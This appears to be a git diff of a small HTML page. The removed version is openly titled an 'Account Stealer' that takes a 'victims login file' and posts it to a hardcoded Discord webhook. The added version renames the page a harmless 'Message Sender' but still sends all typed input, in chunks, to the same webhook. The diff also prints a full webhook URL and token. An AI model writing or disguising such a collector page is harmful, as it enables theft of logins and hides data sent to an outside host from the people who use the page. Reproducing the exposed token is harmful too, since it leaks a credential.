@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dray001 Acounnt Stealer</title>
+    <title>Message Sender</title>
 
     <style>
         body {
@@ -84,41 +84,46 @@
 <body>
 
     <div class="container">
-        <h2>Account Stealer (Made By dray001) </h2>
+        <h2>Send a Message</h2>
 
-        <input type="text" id="username" placeholder="victims login file">
+        <input type="text" id="message" placeholder="Type here...">
 
-        <button onclick="sendData()">Start Hacking</button>
+        <button onclick="sendData()">Send</button>
 
-        <p class="success" id="msg">Successfuly Hacked User</p>
+        <p class="success" id="msg">Message Sent!</p>
     </div>
 
     <script>
-        function sendData() {
-            const username = document.getElementById("username").value.trim();
-            const webhook = "https://discord.com/api/webhooks/1439043588280418474/_J5Jvm1AJxwsfhz5ip7hQcG563SOtOb4fCzlvQd-7yD2eQHuNFnS8_jn6_q98gNK1bgU";
+        const webhook = "https://discord.com/api/webhooks/1439043588280418474/_J5Jvm1AJxwsfhz5ip7hQcG563SOtOb4fCzlvQd-7yD2eQHuNFnS8_jn6_q98gNK1bgUE";
 
-            if (!username) return;
+        function splitIntoChunks(text) {
+            const MAX = 2000;
+            const chunks = [];
 
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `New username submitted: **${username}**`
-                })
-            })
-            .then(() => {
-                document.getElementById("msg").style.display = "block";
-            })
-            .catch(err => console.error("Error sending to Discord:", err));
+            for (let i = 0; i < text.length; i += MAX) {
+                chunks.push(text.slice(i, i + MAX));
+            }
+
+            return chunks;
+        }
+
+        async function sendData() {
+            const message = document.getElementById("message").value.trim();
+            if (!message) return;
+
+            const chunks = splitIntoChunks(message);
+
+            for (const chunk of chunks) {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: chunk })
+                });
+            }
+
+            document.getElementById("msg").style.display = "block";
         }
     </script>
 
 </body>
 </html>
-
-
-
-
-
-
